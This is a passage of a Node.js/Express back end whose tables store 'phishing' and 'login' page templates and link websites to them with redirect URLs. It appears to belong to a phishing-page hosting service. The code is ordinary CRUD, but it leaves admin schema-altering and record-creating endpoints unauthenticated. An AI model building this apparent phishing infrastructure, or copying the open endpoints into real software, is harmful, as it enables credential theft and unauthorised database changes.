         name VARCHAR(255) NOT NULL,
         description TEXT,
         thumbnail VARCHAR(500),
         type ENUM('phishing', 'login') NOT NULL DEFAULT 'phishing',
         content_html TEXT,
         content_css TEXT,
         content_js TEXT,
         is_active BOOLEAN DEFAULT TRUE,
         created_by INT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
         is_shared BOOLEAN DEFAULT FALSE,
         approval_status ENUM('pending', 'approved', 'rejected') DEFAULT 'approved',
         approved_by INT DEFAULT NULL,
         approved_at TIMESTAMP NULL DEFAULT NULL,
         submitted_for_approval_at TIMESTAMP NULL DEFAULT NULL,
         rejection_reason TEXT DEFAULT NULL,
         INDEX idx_type (type),
         INDEX idx_is_active (is_active),
         INDEX idx_created_by (created_by),
         INDEX idx_approval_status (approval_status),
         INDEX idx_is_shared (is_shared),
         INDEX idx_approved_by (approved_by),
         FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL,
         FOREIGN KEY (approved_by) REFERENCES users(id) ON DELETE SET NULL
       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
     `;

    const createTemplateFieldsTableSQL = `
       CREATE TABLE IF NOT EXISTS template_fields (
         id INT AUTO_INCREMENT PRIMARY KEY,
         template_id INT NOT NULL,
         field_name VARCHAR(255) NOT NULL,
         field_type VARCHAR(50) NOT NULL DEFAULT 'text',
         field_label VARCHAR(255) NULL,
         field_placeholder VARCHAR(255) NULL,
         max_length INT DEFAULT 255,
         is_required BOOLEAN DEFAULT FALSE,
         field_order INT DEFAULT 0,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
         INDEX idx_template_id (template_id),
         INDEX idx_field_order (field_order),
         UNIQUE KEY uniq_template_field_name (template_id, field_name),
         FOREIGN KEY (template_id) REFERENCES templates(id) ON DELETE CASCADE
       ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
     `;

    await executeQuery(createTemplatesTableSQL);
    await executeQuery(createTemplateFieldsTableSQL);

    const templatesSchema = await executeQuery('DESCRIBE templates');
    if (templatesSchema.success) {
      const tCols = templatesSchema.data.map(col => col.Field);
      const ensureTemplateColumns = [
        { name: 'is_shared', sql: 'ALTER TABLE templates ADD COLUMN is_shared BOOLEAN DEFAULT FALSE' },
        { name: 'approval_status', sql: "ALTER TABLE templates ADD COLUMN approval_status ENUM('pending','approved','rejected') DEFAULT 'approved'" },
        { name: 'approved_by', sql: 'ALTER TABLE templates ADD COLUMN approved_by INT DEFAULT NULL' },
        { name: 'approved_at', sql: 'ALTER TABLE templates ADD COLUMN approved_at TIMESTAMP NULL DEFAULT NULL' },
        { name: 'submitted_for_approval_at', sql: 'ALTER TABLE templates ADD COLUMN submitted_for_approval_at TIMESTAMP NULL DEFAULT NULL' },
        { name: 'rejection_reason', sql: 'ALTER TABLE templates ADD COLUMN rejection_reason TEXT DEFAULT NULL' }
      ];
      for (const col of ensureTemplateColumns) {
        if (!tCols.includes(col.name)) {
          try {
            await executeQuery(col.sql);
          } catch (error) {
            console.log(`⚠️ Could not add ${col.name} to templates:`, error.message);
          }
        }
      }
    }

    console.log('✅ Templates tables ensured');
  } catch (error) {
    console.error('❌ Error ensuring templates tables:', error);
  }
};

// Initialize table - make sure it completes
(async () => {
  try {
    console.log('🚀 Starting users table initialization...');
    await ensureUsersTable();
    console.log('✅ Users table initialization completed');

    console.log('🚀 Starting websites table initialization...');
    await ensureWebsitesTable();
    console.log('✅ Websites table initialization completed');

    console.log('🚀 Starting user analytics table initialization...');
    await ensureUserAnalyticsTable();
    console.log('✅ User analytics table initialization completed');

    console.log('🚀 Starting IP blacklist table initialization...');
    await ensureIpBlacklistTable();
    console.log('✅ IP blacklist table initialization completed');

    console.log('🚀 Starting templates tables initialization...');
    await ensureTemplatesTables();
    console.log('✅ Templates tables initialization completed');

    console.log('🚀 Starting domains tables initialization...');
    await ensureDomainsTables();
    console.log('✅ Domains tables initialization completed');

  } catch (error) {
    console.error('❌ Failed to initialize tables:', error);
  }
})();

// Run database migrations on startup
// import('./database/migrate.js').then(({ default: runMigrations }) => {
//   runMigrations();
// });

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'OK',
    message: 'Server is running',
    timestamp: new Date().toISOString()
  });
});

// Database test endpoint  
app.get('/api/db-test', async (req, res) => {
  try {
    const result = await executeQuery('SELECT 1 as test');

    // Also check websites table
    let websitesCheck = null;
    try {
      const schemaResult = await executeQuery('DESCRIBE websites');
      if (schemaResult.success) {
        const columns = schemaResult.data.map(col => col.Field);
        websitesCheck = {
          exists: true,
          columns: columns,
          hasTemplateIds: columns.includes('phishing_template_id') && columns.includes('login_template_id')
        };
      }
    } catch (error) {
      websitesCheck = { exists: false, error: error.message };
    }

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Database connection is working',
        data: result.data,
        websites: websitesCheck
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Database connection failed',
        error: result.error
      });
    }
  } catch (error) {
    res.status(500).json({
      status: 'error',
      message: 'Database test failed',
      error: error.message
    });
  }
});

// Force add template columns endpoint
app.post('/api/admin/force-add-columns', async (req, res) => {
  try {
    console.log('🔧 Force adding template columns...');

    // Add phishing_template_id
    const result1 = await executeQuery('ALTER TABLE websites ADD COLUMN phishing_template_id INT NULL');
    console.log('ADD phishing_template_id:', result1);

    // Add login_template_id 
    const result2 = await executeQuery('ALTER TABLE websites ADD COLUMN login_template_id INT NULL');
    console.log('ADD login_template_id:', result2);

    // Check final structure
    const schemaResult = await executeQuery('DESCRIBE websites');
    const columns = schemaResult.success ? schemaResult.data.map(col => col.Field) : [];

    res.json({
      status: 'success',
      message: 'Attempted to add columns',
      results: {
        phishing_template_id: result1,
        login_template_id: result2,
        final_columns: columns,
        has_template_ids: columns.includes('phishing_template_id') && columns.includes('login_template_id')
      }
    });
  } catch (error) {
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Simple test create endpoint (no auth needed)
app.post('/api/test-create', async (req, res) => {
  try {
    console.log('🧪 Test create endpoint called');

    const testData = {
      title: 'Test Website',
      slug: `test-${Date.now()}`,
      description: 'Test description',
      redirect_url: 'https://google.com',
      temp1: '<html>Test</html>',
      temp2: '<html>Login</html>',
      thumbnail: '',
      language: 'en',
      domain: '',
      user_id: 1
    };

    console.log('📝 Test data:', testData);

    // Try insert
    const result = await executeQuery(`
      INSERT INTO websites (title, description, slug, redirect_url, temp1, temp2, phishing_template_id, login_template_id, thumbnail, language, domain, user_id)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, [testData.title, testData.description, testData.slug, testData.redirect_url, testData.temp1, testData.temp2, null, null, testData.thumbnail, testData.language, testData.domain, testData.user_id]);

    console.log('💾 Insert result:', result);

    res.json({
      status: result.success ? 'success' : 'error',
      message: result.success ? 'Test website created' : 'Failed to create',
      data: result.data,
      error: result.error
    });

  } catch (error) {
    console.error('❌ Test create error:', error);
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Authentication middleware - using imported authenticateToken from middleware

// NEW WORKING DASHBOARD API - BYPASSES ALL ISSUES
app.get('/api/dashboard/analytics-new', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    console.log('🚀 NEW API: Getting analytics for user', userId);

    // Get analytics data
    const analyticsResult = await executeQuery('SELECT * FROM user_analytics WHERE user_id = ?', [userId]);
    const analytics = analyticsResult.success && analyticsResult.data.length > 0 ?
      analyticsResult.data[0] : { total_balance: 0, points: 0, tool_use_count: 0 };

    res.json({
      status: 'success',
      data: {
        balance: 0,
        total_balance: parseFloat(analytics.total_balance || 0),
        points: analytics.points || 0,
        tool_use_count: analytics.tool_use_count || 0,
        recent_tools: [],
        notifications: []
      }
    });
  } catch (error) {
    console.error('NEW API Error:', error);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

const authenticateAdmin = async (req, res, next) => {
  try {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
      return res.status(401).json({
        status: 'error',
        message: 'Access token required'
      });
    }

    const decoded = verifyToken(token);
    req.user = decoded;

    // Check if client IP is blacklisted for this user
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.headers['x-real-ip'] ||
      req.connection.remoteAddress ||
      req.ip ||
      'Unknown';

    const blacklistCheck = await executeQuery(
      'SELECT id FROM ip_blacklist WHERE user_id = ? AND ip_address = ? LIMIT 1',
      [decoded.id, clientIP]
    );

    if (blacklistCheck.success && blacklistCheck.data.length > 0) {
      console.log(`🚫 Blocked admin request from blacklisted IP ${clientIP} for user ${decoded.id}`);
      return res.status(403).json({
        status: 'error',
        message: 'Your IP address has been blocked. Please contact support.'
      });
    }

    // Check if user is admin
    const userResult = await executeQuery(
      'SELECT is_admin FROM users WHERE id = ?',
      [decoded.id]
    );

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    const user = userResult.data[0];
    if (!user.is_admin) {
      return res.status(403).json({
        status: 'error',
        message: 'Admin access required'
      });
    }

    next();
  } catch {
    return res.status(403).json({
      status: 'error',
      message: 'Invalid or expired token'
    });
  }
};

// Signup endpoint
app.post('/api/signup', async (req, res) => {
  try {
    const { username, email, password, confirm_password } = req.body;

    // Validation
    if (!username || !email || !password || !confirm_password) {
      return res.status(400).json({
        status: 'error',
        message: 'All fields are required'
      });
    }

    if (password !== confirm_password) {
      return res.status(400).json({
        status: 'error',
        message: 'Passwords do not match'
      });
    }

    // Validate email format
    if (!validateEmail(email)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid email format'
      });
    }

    // Validate username format
    if (!validateUsername(username)) {
      return res.status(400).json({
        status: 'error',
        message: 'Username must be 3-20 characters and contain only letters, numbers, and underscores'
      });
    }

    // Validate password strength
    const passwordValidation = validatePassword(password);
    if (!passwordValidation.valid) {
      return res.status(400).json({
        status: 'error',
        message: passwordValidation.message
      });
    }

    // Check if user already exists
    const existingUser = await executeQuery(
      'SELECT id FROM users WHERE username = ? OR email = ?',
      [username, email]
    );

    if (existingUser.success && existingUser.data.length > 0) {
      return res.status(409).json({
        status: 'error',
        message: 'Username or email already exists'
      });
    }

    // Hash password
    const passwordHash = await hashPassword(password);

    // Create user
    const result = await executeQuery(
      'INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)',
      [username, email, passwordHash]
    );

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to create user',
        error: result.error
      });
    }

    // Get the created user
    const userResult = await executeQuery(
      'SELECT id, username, email, created_at FROM users WHERE id = ?',
      [result.data.insertId]
    );

    if (!userResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch created user'
      });
    }

    const user = userResult.data[0];
    const userWithRole = {
      ...user,
      role: user.is_admin ? 'admin' : 'user'
    };
    const token = generateToken(userWithRole);

    res.status(201).json({
      status: 'success',
      message: 'User created successfully',
      authToken: token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        created_at: user.created_at,
        role: userWithRole.role
      }
    });

  } catch (error) {
    console.error('Signup error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Signin endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        status: 'error',
        message: 'Username and password are required'
      });
    }

    // Get client IP address
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.headers['x-real-ip'] ||
      req.connection.remoteAddress ||
      req.ip ||
      'Unknown';

    // Find user by username or email
    const userResult = await executeQuery(
      'SELECT id, username, email, COALESCE(password_hash, password) as password_hash, is_active, is_admin FROM users WHERE username = ? OR email = ?',
      [username, username]
    );

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(401).json({
        status: 'error',
        message: 'Invalid credentials'
      });
    }

    const user = userResult.data[0];

    // Check if user is active
    if (!user.is_active) {
      return res.status(401).json({
        status: 'error',
        message: 'Account is deactivated'
      });
    }

    // Check if IP is blacklisted for this user
    const blacklistCheck = await executeQuery(
      'SELECT id FROM ip_blacklist WHERE user_id = ? AND ip_address = ?',
      [user.id, clientIP]
    );

    if (blacklistCheck.success && blacklistCheck.data.length > 0) {
      console.log(`🚫 Login attempt blocked from blacklisted IP ${clientIP} for user ${user.id}`);
      return res.status(403).json({
        status: 'error',
        message: 'Your IP address has been blocked. Please contact support if you believe this is an error.'
      });
    }

    // Verify password
    const isValidPassword = await comparePassword(password, user.password_hash);
    if (!isValidPassword) {
      return res.status(401).json({
        status: 'error',
        message: 'Invalid credentials'
      });
    }

    // Generate token with role
    const userWithRole = {
      ...user,
      role: user.is_admin ? 'admin' : 'user'
    };
    const token = generateToken(userWithRole);

    // Save login history
    try {
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Parse user agent to get device info
      const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
      const isTablet = /iPad|Android(?!.*Mobile)|Tablet/i.test(userAgent);
      let deviceType = 'desktop';
      if (isTablet) deviceType = 'tablet';
      else if (isMobile) deviceType = 'mobile';

      // Detect browser
      let browser = 'Unknown';
      if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
      else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
      else if (userAgent.includes('Firefox')) browser = 'Firefox';
      else if (userAgent.includes('Edg')) browser = 'Edge';
      else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browser = 'Opera';

      // Detect OS
      let os = 'Unknown';
      if (userAgent.includes('Windows')) os = 'Windows';
      else if (userAgent.includes('Mac OS')) os = 'macOS';
      else if (userAgent.includes('Linux')) os = 'Linux';
      else if (userAgent.includes('Android')) os = 'Android';
      else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';

      console.log(`💾 Saving login history for user ${user.id}:`, {
        ipAddress: clientIP, deviceType, browser, os, tokenLength: token?.length
      });

      // Insert login history (không lưu session_token vì có thể quá dài)
      const historyResult = await executeQuery(
        `INSERT INTO login_history (user_id, ip_address, user_agent, device_type, browser, os, is_active) 
         VALUES (?, ?, ?, ?, ?, ?, 1)`,
        [user.id, clientIP, userAgent, deviceType, browser, os]
      );

      if (historyResult.success) {
        console.log(`✅ Login history saved successfully for user ${user.id}`);
      } else {
        console.error(`❌ Failed to save login history:`, historyResult.error);
      }
    } catch (historyError) {
      console.error('❌ Error saving login history:', historyError);
      // Don't fail the login if history save fails
    }

    res.json({
      status: 'success',
      message: 'Login successful',
      authToken: token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        is_admin: user.is_admin
      }
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Get user profile
app.get('/api/user/profile', authenticateToken, async (req, res) => {
  try {
    const userResult = await executeQuery(
      'SELECT id, username, email, first_name, last_name, phone, avatar, bio, is_admin, created_at, updated_at FROM users WHERE id = ?',
      [req.user.id]
    );

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    res.json({
      status: 'success',
      user: userResult.data[0]
    });

  } catch (error) {
    console.error('Profile error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Update user profile
app.put('/api/user/profile', authenticateToken, async (req, res) => {
  try {
    const { first_name, last_name, phone, bio } = req.body;
    const userId = req.user.id;

    // Validate input
    if (!first_name && !last_name && !phone && !bio) {
      return res.status(400).json({
        status: 'error',
        message: 'At least one field is required for update'
      });
    }

    // Validate phone format if provided
    if (phone && phone.trim() !== '') {
      const cleanPhone = phone.replace(/[\s\-()]/g, '');
      const phoneRegex = /^[0-9]+$/;

      if (!phoneRegex.test(cleanPhone)) {
        return res.status(400).json({
          status: 'error',
          message: 'Phone number must contain only digits'
        });
      }

      if (cleanPhone.length > 20) {
        return res.status(400).json({
          status: 'error',
          message: 'Phone number must be no more than 20 characters'
        });
      }
    }

    // Build dynamic update query
    const updateFields = [];
    const updateValues = [];

    if (first_name !== undefined) {
      updateFields.push('first_name = ?');
      updateValues.push(first_name ? first_name.trim() : null);
    }
    if (last_name !== undefined) {
      updateFields.push('last_name = ?');
      updateValues.push(last_name ? last_name.trim() : null);
    }
    if (phone !== undefined) {
      updateFields.push('phone = ?');
      updateValues.push(phone ? phone.trim() : null);
    }
    if (bio !== undefined) {
      updateFields.push('bio = ?');
      updateValues.push(bio ? bio.trim() : null);
    }

    // Add updated_at timestamp
    updateFields.push('updated_at = CURRENT_TIMESTAMP');
    updateValues.push(userId);

    const updateQuery = `UPDATE users SET ${updateFields.join(', ')} WHERE id = ?`;

    const result = await executeQuery(updateQuery, updateValues);

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to update profile',
        error: result.error
      });
    }

    // Get updated user data
    const userResult = await executeQuery(
      'SELECT id, username, email, first_name, last_name, phone, avatar, bio, created_at, updated_at FROM users WHERE id = ?',
      [userId]
    );

    if (!userResult.success || userResult.data.length === 0) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch updated profile'
      });
    }

    res.json({
      status: 'success',
      message: 'Profile updated successfully',
      user: userResult.data[0]
    });

  } catch (error) {
    console.error('Profile update error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Configure multer for secure file uploads (avatars)
const avatarStorage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'uploads', 'avatars'));
  },
  filename: (req, file, cb) => {
    // Generate unique filename with timestamp and random string
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `avatar-${uniqueSuffix}${ext}`);
  }
});

const avatarFileFilter = (req, file, cb) => {
  // Only allow image files
  const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp'];
  if (allowedTypes.includes(file.mimetype)) {
    cb(null, true);
  } else {
    cb(new Error('Only image files (JPEG, PNG, GIF, WebP) are allowed'), false);
  }
};

const avatarUpload = multer({
  storage: avatarStorage,
  fileFilter: avatarFileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB limit
    files: 1 // Only one file at a time
  }
});

// Avatar upload endpoint
app.post('/api/user/avatar', authenticateToken, avatarUpload.single('avatar'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({
        status: 'error',
        message: 'No avatar file provided'
      });
    }

    const userId = req.user.id;
    const tempPath = req.file.path;

    try {
      // Process image with sharp for security and optimization
      const processedFilename = `avatar-${userId}-${Date.now()}.webp`;
      const processedPath = path.join(__dirname, 'uploads', 'avatars', processedFilename);

      // Resize and convert to WebP format for security and optimization
      await sharp(tempPath)
        .resize(200, 200, {
          fit: 'cover',
          position: 'center'
        })
        .webp({ quality: 80 })
        .toFile(processedPath);

      // Delete the original temporary file
      fs.unlinkSync(tempPath);

      // Update user avatar in database
      const avatarUrl = `/uploads/avatars/${processedFilename}`;
      const updateResult = await executeQuery(
        'UPDATE users SET avatar = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
        [avatarUrl, userId]
      );

      if (!updateResult.success) {
        // If database update fails, delete the uploaded file
        if (fs.existsSync(processedPath)) {
          fs.unlinkSync(processedPath);
        }
        return res.status(500).json({
          status: 'error',
          message: 'Failed to update avatar in database'
        });
      }

      // Get updated user data
      const userResult = await executeQuery(
        'SELECT id, username, email, first_name, last_name, phone, avatar, bio, created_at, updated_at FROM users WHERE id = ?',
        [userId]
      );

      if (!userResult.success || userResult.data.length === 0) {
        return res.status(500).json({
          status: 'error',
          message: 'Failed to fetch updated profile'
        });
      }

      res.json({
        status: 'success',
        message: 'Avatar updated successfully',
        user: userResult.data[0]
      });

    } catch (processingError) {
      // Clean up files if processing fails
      if (fs.existsSync(tempPath)) {
        fs.unlinkSync(tempPath);
      }
      console.error('Avatar processing error:', processingError);
      return res.status(500).json({
        status: 'error',
        message: 'Failed to process avatar image'
      });
    }

  } catch (error) {
    console.error('Avatar upload error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Serve uploaded files (already configured above)

// Settings endpoints

// Get public settings (for all users)
app.get('/api/settings', async (req, res) => {
  try {
    const result = await executeQuery(
      'SELECT setting_key, setting_value, setting_type FROM site_settings WHERE is_public = true'
    );

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch settings',
        error: result.error
      });
    }

    // Convert array to object
    const settings = {};
    result.data.forEach(setting => {
      let value = setting.setting_value;

      // Parse value based on type
      switch (setting.setting_type) {
        case 'boolean':
          value = value === 'true';
          break;
        case 'number':
          value = parseFloat(value);
          break;
        case 'json':
          try {
            value = JSON.parse(value);
          } catch {
            // Keep as string if parsing fails
          }
          break;
        default:
        // Keep as string
      }

      settings[setting.setting_key] = value;
    });

    res.json({
      status: 'success',
      settings
    });

  } catch (error) {
    console.error('Settings error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Get all settings (admin only)
app.get('/api/admin/settings', authenticateAdmin, async (req, res) => {
  try {
    const result = await executeQuery(
      'SELECT * FROM site_settings ORDER BY setting_key'
    );

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch settings',
        error: result.error
      });
    }

    // Convert array to object
    const settings = {};
    result.data.forEach(setting => {
      let value = setting.setting_value;

      // Parse value based on type
      switch (setting.setting_type) {
        case 'boolean':
          value = value === 'true';
          break;
        case 'number':
          value = parseFloat(value);
          break;
        case 'json':
          try {
            value = JSON.parse(value);
          } catch {
            // Keep as string if parsing fails
          }
          break;
        default:
        // Keep as string
      }

      settings[setting.setting_key] = {
        value,
        type: setting.setting_type,
        description: setting.description,
        is_public: setting.is_public,
        created_at: setting.created_at,
        updated_at: setting.updated_at
      };
    });

    res.json({
      status: 'success',
      settings
    });

  } catch (error) {
    console.error('Admin settings error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Update settings (admin only)
app.put('/api/admin/settings', authenticateAdmin, async (req, res) => {
  try {
    const { settings } = req.body;

    if (!settings || typeof settings !== 'object') {
      return res.status(400).json({
        status: 'error',
        message: 'Settings object is required'
      });
    }

    const updatePromises = Object.entries(settings).map(async ([key, value]) => {
      // Convert value to string based on type
      let stringValue;
      let settingType = 'string';

      if (typeof value === 'boolean') {
        stringValue = value.toString();
        settingType = 'boolean';
      } else if (typeof value === 'number') {
        stringValue = value.toString();
        settingType = 'number';
      } else if (typeof value === 'object') {
        stringValue = JSON.stringify(value);
        settingType = 'json';
      } else {
        stringValue = value.toString();
      }

      // Update or insert setting
      const result = await executeQuery(
        `INSERT INTO site_settings (setting_key, setting_value, setting_type, updated_at) 
         VALUES (?, ?, ?, CURRENT_TIMESTAMP)
         ON DUPLICATE KEY UPDATE 
         setting_value = VALUES(setting_value),
         setting_type = VALUES(setting_type),
         updated_at = CURRENT_TIMESTAMP`,
        [key, stringValue, settingType]
      );

      return result;
    });

    const results = await Promise.all(updatePromises);

    // Check if any updates failed
    const failedUpdates = results.filter(result => !result.success);
    if (failedUpdates.length > 0) {
      return res.status(500).json({
        status: 'error',
        message: 'Some settings failed to update',
        errors: failedUpdates.map(r => r.error)
      });
    }

    res.json({
      status: 'success',
      message: 'Settings updated successfully'
    });

  } catch (error) {
    console.error('Update settings error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Admin user management endpoints

// Get all users with pagination and filtering (admin only)
app.get('/api/admin/users', authenticateAdmin, async (req, res) => {
  try {
    const {
      page = 1,
      limit = 10,
      search = '',
      status = 'all',
      sortBy = 'created_at',
      sortOrder = 'DESC'
    } = req.query;

    // Validate pagination parameters
    const pageNum = Math.max(1, parseInt(page));
    const limitNum = Math.min(100, Math.max(1, parseInt(limit)));
    const offset = (pageNum - 1) * limitNum;

    // Validate sort parameters
    const allowedSortFields = ['id', 'username', 'email', 'created_at', 'updated_at', 'is_active', 'is_admin'];
    const sortField = allowedSortFields.includes(sortBy) ? sortBy : 'created_at';
    const sortDirection = sortOrder.toUpperCase() === 'ASC' ? 'ASC' : 'DESC';

    // Build WHERE conditions
    let whereConditions = [];
    let queryParams = [];

    // Search condition
    if (search && search.trim()) {
      whereConditions.push('(username LIKE ? OR email LIKE ? OR first_name LIKE ? OR last_name LIKE ?)');
      const searchTerm = `%${search.trim()}%`;
      queryParams.push(searchTerm, searchTerm, searchTerm, searchTerm);
    }

    // Status condition
    if (status === 'active') {
      whereConditions.push('is_active = ?');
      queryParams.push(true);
    } else if (status === 'inactive') {
      whereConditions.push('is_active = ?');
      queryParams.push(false);
    }

    const whereClause = whereConditions.length > 0 ? `WHERE ${whereConditions.join(' AND ')}` : '';

    // Get total count
    const countQuery = `SELECT COUNT(*) as total FROM users ${whereClause}`;
    const countParams = queryParams.length > 0 ? queryParams : [];
    const countResult = await executeQuery(countQuery, countParams);

    if (!countResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to count users',
        error: countResult.error
      });
    }

    const totalUsers = countResult.data[0].total;
    const totalPages = Math.ceil(totalUsers / limitNum);

    // Get users with pagination
    let usersQuery, usersParams;

    if (queryParams.length > 0) {
      usersQuery = `
        SELECT 
          id, username, email, first_name, last_name, phone, avatar, bio, 0 as balance,
          is_active, is_admin, email_verified, created_at, updated_at
        FROM users 
        ${whereClause}
        ORDER BY ${sortField} ${sortDirection}
        LIMIT ${limitNum} OFFSET ${offset}
      `;
      usersParams = queryParams;
    } else {
      usersQuery = `
        SELECT 
          id, username, email, first_name, last_name, phone, avatar, bio, 0 as balance,
          is_active, is_admin, email_verified, created_at, updated_at
        FROM users 
        ORDER BY ${sortField} ${sortDirection}
        LIMIT ${limitNum} OFFSET ${offset}
      `;
      usersParams = [];
    }

    const usersResult = await executeQuery(usersQuery, usersParams);

    if (!usersResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch users',
        error: usersResult.error
      });
    }

    res.json({
      status: 'success',
      data: {
        users: usersResult.data,
        pagination: {
          currentPage: pageNum,
          totalPages,
          totalUsers,
          limit: limitNum,
          hasNext: pageNum < totalPages,
          hasPrev: pageNum > 1
        },
        filters: {
          search,
          status,
          sortBy: sortField,
          sortOrder: sortDirection
        }
      }
    });

  } catch (error) {
    console.error('Admin users error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Export users (admin only) - MUST be before /:id route
app.get('/api/admin/users/export', authenticateAdmin, async (req, res) => {
  try {
    const { format = 'csv', status = 'all' } = req.query;

    // Validate format
    if (!['csv', 'excel', 'json'].includes(format)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid format. Supported formats: csv, excel, json'
      });
    }

    // Build WHERE conditions for export
    let whereConditions = [];
    let queryParams = [];

    // Status condition
    if (status === 'active') {
      whereConditions.push('is_active = ?');
      queryParams.push(true);
    } else if (status === 'inactive') {
      whereConditions.push('is_active = ?');
      queryParams.push(false);
    }

    const whereClause = whereConditions.length > 0 ? `WHERE ${whereConditions.join(' AND ')}` : '';

    // Get all users for export
    const usersQuery = `
      SELECT 
        id, username, email, first_name, last_name, phone, avatar, bio,
        is_active, is_admin, email_verified, created_at, updated_at
      FROM users 
      ${whereClause}
      ORDER BY created_at DESC
    `;

    const usersParams = queryParams.length > 0 ? queryParams : [];
    const usersResult = await executeQuery(usersQuery, usersParams);

    if (!usersResult.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch users for export',
        error: usersResult.error
      });
    }

    const users = usersResult.data;

    if (format === 'json') {
      return res.json({
        status: 'success',
        data: {
          users,
          exportInfo: {
            format: 'json',
            totalUsers: users.length,
            exportedAt: new Date().toISOString(),
            status
          }
        }
      });
    }

    // Generate CSV content
    if (format === 'csv') {
      const csvHeaders = [
        'ID', 'Username', 'Email', 'First Name', 'Last Name', 'Phone',
        'Avatar', 'Bio', 'Active', 'Admin', 'Email Verified',
        'Created At', 'Updated At'
      ];

      const csvRows = users.map(user => [
        user.id,
        user.username,
        user.email,
        user.first_name || '',
        user.last_name || '',
        user.phone || '',
        user.avatar || '',
        user.bio || '',
        user.is_active ? 'Yes' : 'No',
        user.is_admin ? 'Yes' : 'No',
        user.email_verified ? 'Yes' : 'No',
        user.created_at,
        user.updated_at
      ]);

      // Escape CSV values
      const escapeCsvValue = (value) => {
        if (value === null || value === undefined) return '';
        const stringValue = String(value);
        if (stringValue.includes(',') || stringValue.includes('"') || stringValue.includes('\n')) {
          return `"${stringValue.replace(/"/g, '""')}"`;
        }
        return stringValue;
      };

      const csvContent = [
        csvHeaders.map(escapeCsvValue).join(','),
        ...csvRows.map(row => row.map(escapeCsvValue).join(','))
      ].join('\n');

      const filename = `users_export_${new Date().toISOString().split('T')[0]}.csv`;

      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
      return res.send(csvContent);
    }

    // Generate Excel content (simplified - just CSV with .xlsx extension)
    if (format === 'excel') {
      const csvHeaders = [
        'ID', 'Username', 'Email', 'First Name', 'Last Name', 'Phone',
        'Avatar', 'Bio', 'Active', 'Admin', 'Email Verified',
        'Created At', 'Updated At'
      ];

      const csvRows = users.map(user => [
        user.id,
        user.username,
        user.email,
        user.first_name || '',
        user.last_name || '',
        user.phone || '',
        user.avatar || '',
